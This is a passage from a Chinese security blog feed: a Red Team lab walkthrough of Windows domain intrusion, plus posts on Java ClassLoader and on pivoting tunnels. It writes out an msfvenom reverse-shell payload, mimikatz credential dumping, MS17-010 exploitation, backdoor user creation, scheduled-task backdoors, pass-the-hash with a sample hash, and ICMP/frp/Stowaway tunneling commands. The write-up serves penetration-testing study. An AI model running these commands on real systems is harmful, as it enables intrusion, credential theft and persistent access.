classLoader.loadClass(<span class="string">&quot;com.test.Test&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用URLClassLoader加载网络中的Tomcat服务器目录，成功解析获取到了目录下的Test.class文件。</p><p><img src="/../images/20210108154306-25852314-5185-1.png" alt="20210108154306-25852314-5185-1"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过ClassLoader类的学习，我们知道不仅仅局限于在ClassPath中类的调用，还能够通过自定义CLassLoader类来加载我们特定的类来操作利用。在安全领域当中，我们往往会使用其ClassLoader特性，自定义恶意的类加载webshell利用以及自定以类字节码的native方法绕过RASP检测。所以了解ClassLoader特性并进行自定义编写，对我们了解java安全机制十分重要。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场1</title>
      <link href="/2023/05/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"/>
      <url>/2023/05/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>通过MSF对红日靶场1进行内网渗透</p><p>获得边界服务器权限没啥好写的就不写了</p></blockquote><h2 id="获得外网主机权限"><a href="#获得外网主机权限" class="headerlink" title="获得外网主机权限"></a>获得外网主机权限</h2><h3 id="木马生成"><a href="#木马生成" class="headerlink" title="木马生成"></a>木马生成</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128  -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure><p><strong>reverse_tcp与bind_tcp的区别</strong></p><p><img src="/../images/1605154-20200928100839725-1360637319-1686283281460.png" alt="img"></p><h3 id="防火墙关闭"><a href="#防火墙关闭" class="headerlink" title="防火墙关闭"></a>防火墙关闭</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul><li><p>查看状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br></pre></td></tr></table></figure></li><li><p>更改状态</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofile state on/off</span><br></pre></td></tr></table></figure><p>不关的话，执行木马就会弹出这个</p><p><img src="/../images/image-20230324195048832-1686283281461.png" alt="image-20230324195048832"></p></li></ul><h3 id="获得主机session"><a href="#获得主机session" class="headerlink" title="获得主机session"></a>获得主机session</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp # 要设置木马的生成payload，不然连不上</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324151026344-1686283281461.png" alt="image-20230324151026344"></p><h2 id="信息收集等"><a href="#信息收集等" class="headerlink" title="信息收集等"></a>信息收集等</h2><h4 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h4><ol><li><p>隐蔽自身</p><p>选择注入到explorer.exe进程中</p><blockquote><p>explorer.exe是<a href="https://baike.baidu.com/item/Windows/165458?fromModule=lemma_inlink">Windows</a>程序管理器或者<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/58635296?fromModule=lemma_inlink">文件资源管理器</a>，它用于管理Windows图形壳，包括桌面和<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/1452357?fromModule=lemma_inlink">文件管理</a>，删除该程序会导致Windows<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/8146283?fromModule=lemma_inlink">图形界面</a>无法使用。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps | grep &quot;explore&quot;</span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324152046245-1686283281461.png" alt="image-20230324152046245"></p></li><li><p>切换进程位数</p><blockquote><p>不同的程序需要的位数不同</p><p>如：hashdump，kiwi只能在64位进程上执行</p></blockquote></li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><blockquote><p>先获取到administrator权限</p><p>再使用getsystem命令获取system权限</p></blockquote><p><img src="/../images/image-20230324152320920-1686283281461.png" alt="image-20230324152320920"></p><h4 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主机信息</span></span><br><span class="line">ps</span><br><span class="line">sysinfo</span><br><span class="line">run post/windows/gather/enum_applications # 安装的应用</span><br><span class="line">run post/windows/gather/enum_patches # 安装的补丁</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网络</span></span><br><span class="line">route</span><br><span class="line">arp</span><br><span class="line">netstat –ano</span><br></pre></td></tr></table></figure><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324155246737-1686283281461.png" alt="image-20230324155246737"></p><p>主机shell下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chcp 65001 #解决乱码</span><br><span class="line">ipconfig /all # DNS后缀判断域是否存在</span><br><span class="line">net time /domain # 判断域控</span><br><span class="line">nslookup time_domain # 获取域控ip</span><br></pre></td></tr></table></figure><h4 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure><h5 id="调用mimikatz"><a href="#调用mimikatz" class="headerlink" title="调用mimikatz"></a>调用mimikatz</h5><blockquote><p>在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatz命令</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html">后渗透]Mimikatz使用大全 - 肖洋肖恩、 - 博客园</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">portfwd add -l 1234 -p 4444 -r 192.168.41.129</span><br></pre></td></tr></table></figure><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="Venom代理"><a href="#Venom代理" class="headerlink" title="Venom代理"></a>Venom代理</h3><p><a href="https://blog.csdn.net/u011215939/article/details/103403545">内网穿透工具—Venom使用教程</a></p><p><img src="/../images/image-20230331194420393-1686283281461.png" alt="image-20230331194420393"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks port</span><br><span class="line">然后配合proxychains使用</span><br></pre></td></tr></table></figure><h3 id="sockets代理"><a href="#sockets代理" class="headerlink" title="sockets代理"></a>sockets代理</h3><h4 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h4><ul><li>为当前sesison添加路由</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170547279-1686283281461.png" alt="image-20230324170547279"></p><ul><li><p>使用socks5模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324170759790-1686283281461.png" alt="image-20230324170759790"></p><p>这里需要按一下回车</p><ul><li><p>查看jobs </p><p><img src="/../images/image-20230324170854437-1686283281462.png" alt="image-20230324170854437"></p></li></ul></li></ul><h4 id="kali配置"><a href="#kali配置" class="headerlink" title="kali配置"></a>kali配置</h4><blockquote><p>让kali中的其他工具也可访问内网主机</p></blockquote><ul><li><p>安装proxychains</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br></pre></td></tr></table></figure></li><li><p>编辑配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>按照info给出的信息，添加socket代理</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VERSION SRVHOST SRVPORT USERNAME PASSWORD</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324171113565-1686283281462.png" alt="image-20230324171113565"></p></li></ul><p><img src="/../images/image-20230324170936060-1686283281462.png" alt="image-20230324170936060"></p><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner rhosts=192.168.52.0/24</span><br></pre></td></tr></table></figure><h3 id="端口和漏洞扫描"><a href="#端口和漏洞扫描" class="headerlink" title="端口和漏洞扫描"></a>端口和漏洞扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">上传fscan进行扫描</span><br><span class="line"></span><br><span class="line">proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC  192.168.52.141</span><br></pre></td></tr></table></figure><p>注意：socks5代理-Pn -sT，不支持icmp协议</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据fscan的扫描结果可以知道域中三台主机均存在ms17_010漏洞</p><p>利用</p><p><img src="/../images/image-20230324192937093-1686283281462.png" alt="image-20230324192937093"></p><p>经过测试，发现只能用<code>admin/smb/ms17_010_command</code></p><p>在Windows2003主机上</p><p><img src="/../images/image-20230330141915854-1686283281462.png" alt="image-20230330141915854"></p><p>添加成功</p><p><img src="/../images/image-20230330142326253-1686283281462.png" alt="image-20230330142326253"></p><p>同理域控server2008也可以使用该payload</p><h4 id="ipc-连接"><a href="#ipc-连接" class="headerlink" title="ipc$连接"></a>ipc$连接</h4><blockquote><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip /u:username password # 建立ipc$连接</span><br><span class="line"><span class="built_in">net</span> view \\ip # 查看目标机器的共享资源</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ # 将目标c盘映射为本地z盘</span><br><span class="line"><span class="built_in">dir</span> \\ip\盘符$\dir_path  # 列出指定目录文件</span><br><span class="line"><span class="built_in">copy</span> \\ip\盘符$\file save_path # 下载文件 save_path为绝对路径/保存到当前目录</span><br><span class="line"><span class="built_in">copy</span> file \\ip\盘符$\file # 复制文件</span><br><span class="line"><span class="built_in">net</span> use \\ip /<span class="built_in">del</span> /y # 删除ipc$连接</span><br></pre></td></tr></table></figure><ul><li><p>版本＜Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # 查看目标机器时间</span><br><span class="line"><span class="built_in">at</span> \\ip <span class="built_in">time</span>(<span class="number">11</span>:<span class="number">12</span>) c:\<span class="number">1</span>.bat # 创建定时任务</span><br></pre></td></tr></table></figure></li><li><p>版本＞Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # 查看目标机器时间</span><br><span class="line"></span><br><span class="line">schtasks /create /tn &quot;task&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S ip /RU System /u username /p &quot;passwd&quot;</span><br><span class="line"># 创建该时间之后的某个时刻自动执行任务，任务名 plugin_update</span><br><span class="line"></span><br><span class="line">schtasks /run /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># 立即运行后门程序</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># 删除创建的任务</span><br></pre></td></tr></table></figure></li></ul><p>这里添加了用户，用外网机使用ipc$与域控建立连接后，发现没有权限</p><p><img src="/../images/image-20230331151440023-1686283281462.png" alt="image-20230331151440023"></p><p>这是因为权限问题</p><p><a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">关于IPC和PTH用户权限问题 | AresX’s Blog</a></p><blockquote><p>可以建立ipc$连接：</p><ul><li><p>域用户，并且该域用户在远程计算机的管理员组中。</p></li><li><p>本地管理员用户</p></li></ul><p>（如果本地管理员组启用了Administrator，那么本地管理员里只有Administrator是可以连接的）</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user khaz123 khaz777... /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure><p>将khaz123用户添加到域控的本地管理员组中（因为是域控服务器添加用户，该用户自动为域用户），ipc$连接成功</p><p><img src="/../images/image-20230330235734609-1686283281462.png" alt="image-20230330235734609"></p><h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><p>同一时刻只能有一个用户登录</p><p><img src="/../images/image-20230331194248211-1686283281462.png" alt="image-20230331194248211"></p><h5 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><blockquote><p>实际上post&#x2F;windows&#x2F;manage&#x2F;enable_rdp就是利用了上面windows修改注册表的方式开启3389端口</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesktop ip </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324160952786-1686283281462.png" alt="image-20230324160952786"></p><h4 id="PTH-哈希传递攻击"><a href="#PTH-哈希传递攻击" class="headerlink" title="PTH 哈希传递攻击"></a>PTH 哈希传递攻击</h4><blockquote><p>挑战响应机制，只要知道NTLM哈希，无需知道明文密码，就可以通过认证</p></blockquote><ul><li>impacket</li></ul><p>安装：<code>sudo apt install python3-impacket</code></p><p><img src="/../images/image-20230331172307275-1686283281462.png" alt="image-20230331172307275"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains  xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f  Administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">wmiexec.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230331172323473-1686283281462.png" alt="image-20230331172323473"></p><p><img src="/../images/image-20230331172427568-1686283281462.png" alt="image-20230331172427568"></p><p><img src="/../images/image-20230331172508321-1686283281462.png" alt="image-20230331172508321"></p><ul><li><p>MSF</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass LM:NTLM</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h4 id="PTT票据传递"><a href="#PTT票据传递" class="headerlink" title="PTT票据传递"></a>PTT票据传递</h4><blockquote><p>只要知道了KDC和Server密钥，即可伪造黄金票据和白银票据</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><p><a href="https://blog.51cto.com/u_15127677/4045185">https://blog.51cto.com/u_15127677/4045185</a></p><p><a href="https://soapffz.com/archives/558/">https://soapffz.com/archives/558/</a></p><p><a href="https://xz.aliyun.com/t/2536">后渗透之meterpreter使用攻略 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>端口转发与代理搭建</title>
      <link href="/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/05/01/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p><img src="/../images/v2-c489e7c96d4a67802a723372c38431f7_1440w.awebp" alt="img"></p><p>SOCKS代理</p><blockquote><p>SOCKS全称为Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其只是简单地传递数据包，而并不关心是何种应用协议，标准端口为1080。</p><p>SOCKS代理有SOCKS4和SOCKS5两个版本。SOCKS4只支持<strong>TCP</strong>，而SOCKS5在SOCKS4 的基础上进一步扩展，可以支持UDP和各种身份验证机制等协议。</p><p>在内网渗透中，通过搭建SOCKS代理，可以与目标内网主机进行通信，避免多次使用端口转发。</p></blockquote><h1 id="探测目标各种协议是否出网及对应隧道搭建"><a href="#探测目标各种协议是否出网及对应隧道搭建" class="headerlink" title="探测目标各种协议是否出网及对应隧道搭建"></a>探测目标各种协议是否出网及对应隧道搭建</h1><p><strong>ICMP</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 114.114.114.114 -n 1<span class="comment">#Windows</span></span><br><span class="line">ping 114.114.114.114 -c 1<span class="comment">#Linux</span></span><br></pre></td></tr></table></figure><p><strong>隧道搭建</strong></p><p><img src="/../images/t012750ea1bdf1f4141.png" alt="img"></p><p>通过data部分来传输数据</p><ul><li><p>icmpsh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-t host 发送ping请求的主机ip地址，即攻击机的IP [该命令必须存在] </span><br><span class="line">-d milliseconds 请求时间间隔（毫秒） </span><br><span class="line">-o milliseconds 响应超时时间（毫秒） </span><br><span class="line">-s bytes 最大数据缓冲区大小（字节）</span><br></pre></td></tr></table></figure><p>攻击机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 install impacket <span class="comment"># 安装依赖</span></span><br><span class="line">sudo python2 icmpsh_m.py 攻击机IP 目标机IP</span><br></pre></td></tr></table></figure><p>目标机上</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1  <span class="comment">#关闭本地ICMP应答，防止不稳定</span></span><br><span class="line">./icmpsh.exe -t 攻击机IP</span><br></pre></td></tr></table></figure></li><li><p><a href="https://teamssix.com/210407-183605.html">【内网学习笔记】6、ICMP隧道工具使用 | TeamsSix</a></p></li></ul><p><strong>HTTP</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure><p><strong>DNS</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nslookup baidu.com</span><br></pre></td></tr></table></figure><p>隧道搭建</p><p><a href="https://github.com/zfl9/dns2tcp">zfl9&#x2F;dns2tcp: 将 dns 查询从 udp 转为 tcp 的实用工具 (github.com)</a></p><p><a href="https://github.com/vaycore/DNStxt-exp">vaycore&#x2F;DNStxt-exp: 一个提供查询 TXT 记录的 DNS 服务利用工具。例如：可配合 Windows 下的 certutil 工具传输小文件（64KB） (github.com)</a></p><p><strong>TCP</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Telent ip</span><br></pre></td></tr></table></figure><h1 id="代理搭建"><a href="#代理搭建" class="headerlink" title="代理搭建"></a>代理搭建</h1><p><img src="/../images/27cbd536f2e946798278123b5fb9572atplv-k3u1fbpfcp-watermark.png" alt="27cbd536f2e946798278123b5fb9572a~tplv-k3u1fbpfcp-watermark"></p><h2 id="反向代理搭建–目标能访问VPS"><a href="#反向代理搭建–目标能访问VPS" class="headerlink" title="反向代理搭建–目标能访问VPS"></a>反向代理搭建–目标能访问VPS</h2><h3 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h3><ul><li><p>服务端（公网服务器）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./nps install<span class="comment">#安装</span></span><br><span class="line">sudo nps start<span class="comment">#启动</span></span><br><span class="line">sudo nps stop<span class="comment">#停止</span></span><br><span class="line">sudo nps reload<span class="comment">#服务端配置文件重载</span></span><br></pre></td></tr></table></figure><p>配置文件<code>/etc/nps/conf/nps.conf</code>，主要修改</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># http代理</span></span><br><span class="line">http_proxy_ip=0.0.0.0</span><br><span class="line">http_proxy_port=80 </span><br><span class="line">https_proxy_port=443</span><br><span class="line">https_just_proxy=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##桥接</span></span><br><span class="line">bridge_type=tcp</span><br><span class="line">bridge_port=8024 <span class="comment">##客户端与服务端连接端口</span></span><br><span class="line">bridge_ip=0.0.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># web端设置</span></span><br><span class="line">web_host=xxx  <span class="comment"># 公网ip</span></span><br><span class="line">web_username=admin     <span class="comment"># web端登录账号密码 可以修改</span></span><br><span class="line">web_password=de1ta    </span><br><span class="line">web_port = 8080      <span class="comment"># web端端口</span></span><br></pre></td></tr></table></figure><p>默认配置运行nps服务端启动会占用80，8080，8024端口</p></li><li><p>客户端（内网主机）</p><p>使用无配置文件模式</p><p><img src="/../images/image-20230918141729869.png" alt="image-20230918141729869"></p><p><img src="/../images/image-20230918141750030.png" alt="image-20230918141750030"></p><p>使用该命令启动客户端即可连接至服务端</p><p>成功连接后，点击隧道按钮来创建隧道</p><p><img src="/../images/image-20230918142001064.png" alt="image-20230918142001064"></p></li></ul><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p><strong>服务端（公网服务器）</strong></p><p>配置<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment"># 客户端与服务端通信的端口</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure><p><strong>客户端（内网主机）</strong></p><p>配置<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">47.120</span>.<span class="number">7.67</span> <span class="comment"># 服务端IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  通信端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># 服务端代理端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># 是否加密</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># 是否压缩</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">start</span>/b C:\tmp\frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><h3 id="CS的socks4代理"><a href="#CS的socks4代理" class="headerlink" title="CS的socks4代理"></a>CS的socks4代理</h3><p><strong>首先需要将心跳sleep设置为0</strong></p><p>Beacon右键</p><p><img src="/../images/image-20231014205724384.png" alt="image-20231014205724384"></p><p><img src="/../images/image-20231014205748506.png" alt="image-20231014205748506"></p><p>创建了socks4隧道</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socks4:CS服务端IP:选择的port</span><br></pre></td></tr></table></figure><h2 id="正向代理搭建–VPS能访问目标"><a href="#正向代理搭建–VPS能访问目标" class="headerlink" title="正向代理搭建–VPS能访问目标"></a>正向代理搭建–VPS能访问目标</h2><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><ul><li><p>生成服务端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure></li><li><p>上传对应的tunnel至目标主机</p></li><li><p>在本地建立Socks5代理</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python neoreg.py -k password -u http://xx/tunnel.php</span><br></pre></td></tr></table></figure></li></ul><h2 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p><img src="/../images/b197db7d5642aacd23fe8b42fd65cd15.png" alt="img"></p><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a href="https://github.com/ph4ntonn/Stowaway">ph4ntonn&#x2F;Stowaway: 👻Stowaway – Multi-hop Proxy Tool for pentesters (github.com)</a></p><p><strong>控制端VPS</strong></p><ul><li><p>开启监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认监听0.0.0.0，-s为密码</span></span><br><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure></li><li><p>节点管理</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">detail展示在线节点的详细信息</span><br><span class="line">topo展示在线节点的父子关系</span><br><span class="line">use使用某个agent</span><br><span class="line"><span class="built_in">exit</span>退出</span><br></pre></td></tr></table></figure></li></ul><p><strong>第一层内网</strong></p><p>win2012-1连接VPS端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --reconnect重连间隔时间</span></span><br><span class="line">./windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure><p>控制端VPS</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0 <span class="comment"># 进入win2012-1节点</span></span><br><span class="line">socks 7777 admin admin <span class="comment"># 创建第一层内网代理</span></span><br></pre></td></tr></table></figure><p><strong>第二层内网</strong></p><p>控制端VPS</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0 <span class="comment"># 进入win2012-1节点</span></span><br><span class="line">listen</span><br></pre></td></tr></table></figure><p><img src="/../images/362ce4a074848570144ecb77cd0e723b.png" alt="img"></p><p>win7连接win2012-1端口</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --reconnect重连间隔时间</span></span><br><span class="line">./windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure><h3 id="Frp-1"><a href="#Frp-1" class="headerlink" title="Frp"></a>Frp</h3><p><strong>第一层内网</strong></p><p><strong>服务端（VPS）</strong></p><p>配置<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment"># 客户端与服务端通信的端口</span></span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> ./frps -c frps.ini 